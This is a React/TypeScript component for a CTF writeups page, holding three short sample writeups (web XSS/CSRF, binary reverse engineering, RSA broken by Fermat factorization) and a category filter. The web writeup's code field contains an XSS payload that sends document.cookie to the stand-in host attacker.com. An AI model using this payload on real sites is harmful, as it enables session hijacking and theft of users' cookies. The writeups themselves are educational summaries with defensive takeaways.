import { motion } from 'framer-motion'
import { useState } from 'react'
import { Link } from 'react-router-dom'

interface WriteupSection {
  title: string;
  content: string;
  code?: string;
}

interface CTFWriteup {
  id: string;
  title: string;
  category: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  date: string;
  description: string;
  tags: string[];
  content: WriteupSection[];
  takeaways: string[];
}

export const writeups: CTFWriteup[] = [
  {
    id: 'web-exploitation-xss-csrf',
    title: "Web Exploitation Challenge",
    category: "Web",
    difficulty: "Medium",
    date: "2024-03-15",
    description: "A detailed walkthrough of exploiting XSS and CSRF vulnerabilities in a web application.",
    tags: ["XSS", "CSRF", "JavaScript"],
    content: [
      {
        title: "Initial Reconnaissance",
        content: "The challenge presented a simple blog platform with user authentication and post creation functionality. Upon inspection of the source code and HTTP requests, several potential vulnerabilities were identified."
      },
      {
        title: "Vulnerability Discovery",
        content: "The application failed to properly sanitize user input in the comment section, allowing for the injection of malicious JavaScript code. Additionally, the CSRF token implementation was found to be vulnerable.",
        code: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`
      },
      {
        title: "Exploitation",
        content: "By combining the XSS vulnerability with the CSRF weakness, we were able to create a payload that would steal user sessions and perform unauthorized actions on behalf of authenticated users."
      }
    ],
    takeaways: [
      "Always validate and sanitize user input",
      "Implement proper CSRF protection",
      "Use Content Security Policy headers",
      "Regular security audits are crucial"
    ]
  },
  {
    id: 'binary-analysis-reverse-engineering',
    title: "Binary Analysis Deep Dive",
    category: "Binary",
    difficulty: "Hard",
    date: "2024-02-28",
    description: "Reverse engineering a complex binary to find hidden functionality and bypass protections.",
    tags: ["Reverse Engineering", "Assembly", "Buffer Overflow"],
    content: [
      {
        title: "Initial Analysis",
        content: "The challenge provided a stripped ELF binary with multiple anti-debugging techniques and obfuscated functionality.",
        code: "file ./challenge\n./challenge: ELF 64-bit LSB executable, x86-64, dynamically linked"
      },
      {
        title: "Bypassing Protections",
        content: "Using dynamic analysis and binary patching, we identified and neutralized anti-debugging checks while preserving core functionality."
      },
      {
        title: "Finding the Flag",
        content: "The flag was encrypted and split across multiple functions, requiring careful analysis of the assembly code and reconstruction of the decryption algorithm."
      }
    ],
    takeaways: [
      "Understanding assembly is crucial for reverse engineering",
      "Anti-debugging techniques can be bypassed with patience",
      "Dynamic analysis complements static analysis",
      "Document your findings as you go"
    ]
  },
  {
    id: 'crypto-challenge-rsa',
    title: "Cryptography Challenge",
    category: "Crypto",
    difficulty: "Medium",
    date: "2024-02-15",
    description: "Breaking a custom encryption implementation using mathematical analysis.",
    tags: ["RSA", "Mathematics", "Python"],
    content: [
      {
        title: "Understanding the Implementation",
        content: "The challenge involved a custom RSA implementation with a twist - the public exponent was unusually small and the modulus showed interesting properties."
      },
      {
        title: "Identifying the Weakness",
        content: "Analysis revealed that the modulus was generated using primes that were too close together, making it vulnerable to Fermat factorization.",
        code: `def fermat_factorization(n):
    a = math.isqrt(n)
    b2 = a*a - n
    while not is_perfect_square(b2):
        a += 1
        b2 = a*a - n
    return a - math.isqrt(b2), a + math.isqrt(b2)`
      },
      {
        title: "Solution Implementation",
        content: "Using Python, we implemented the Fermat factorization algorithm to break the RSA encryption and recover the flag."
      }
    ],
    takeaways: [
      "Always use cryptographically secure parameters",
      "Small public exponents can be dangerous",
      "Mathematical properties of primes are crucial in cryptography",
      "Test your implementation against known attacks"
    ]
  }
];

const CTFWriteups = () => {
  const [selectedCategory, setSelectedCategory] = useState<string>('All');
  
  const categories = ['All', ...new Set(writeups.map(w => w.category))];
  
  const filteredWriteups = selectedCategory === 'All' 
    ? writeups 
    : writeups.filter(w => w.category === selectedCategory);

  const container = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: {
        staggerChildren: 0.1
      }
    }
  };

  const item = {
    hidden: { opacity: 0, y: 20 },
    show: { opacity: 1, y: 0 }
  };

  return (
    <section className="min-h-screen py-32 px-4 bg-background">
      <div className="container mx-auto max-w-6xl">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center mb-16"
        >
          <h1 className="text-4xl md:text-5xl font-bold text-primary mb-4">
            CTF Writeups
          </h1>
          <p className="text-lg text-foreground/80 max-w-2xl mx-auto">
            Detailed analysis and solutions for various Capture The Flag challenges,
            sharing knowledge and techniques with the security community.
          </p>
        </motion.div>

        <motion.div 
          className="flex gap-4 justify-center mb-12 flex-wrap"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.2 }}
        >
          {categories.map((category) => (
            <motion.button
              key={category}
              onClick={() => setSelectedCategory(category)}
              className={`px-4 py-2 rounded-full text-sm font-medium transition-colors ${
                selectedCategory === category
                  ? 'bg-primary text-primary-foreground'
                  : 'bg-card hover:bg-primary/10 text-foreground/80'
              }`}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
            >
              {category}
            </motion.button>
          ))}
        </motion.div>

        <motion.div
          variants={container}
          initial="hidden"
          animate="show"
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"
        >
          {filteredWriteups.map((writeup) => (
            <Link to={`/ctf-writeups/${writeup.id}`} key={writeup.id}>
              <motion.article
                variants={item}
                className="bg-card rounded-xl p-6 hover:shadow-lg transition-all hover:-translate-y-1"
              >
                <div className="flex justify-between items-start mb-4">
                  <span className={`text-sm font-medium px-3 py-1 rounded-full ${
                    writeup.difficulty === 'Easy' ? 'bg-green-500/10 text-green-500' :
                    writeup.difficulty === 'Medium' ? 'bg-yellow-500/10 text-yellow-500' :
                    'bg-red-500/10 text-red-500'
                  }`}>
                    {writeup.difficulty}
                  </span>
                  <span className="text-sm text-foreground/60">{writeup.date}</span>
                </div>
                
                <h3 className="text-xl font-semibold text-primary mb-2">
                  {writeup.title}
                </h3>
                
                <p className="text-foreground/80 mb-4">
                  {writeup.description}
                </p>
                
                <div className="flex flex-wrap gap-2">
                  {writeup.tags.map((tag) => (
                    <span
                      key={tag}
                      className="text-xs bg-primary/10 text-primary px-2 py-1 rounded-full"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              </motion.article>
            </Link>
          ))}
        </motion.div>
      </div>
    </section>
  );
};

export default CTFWriteups; 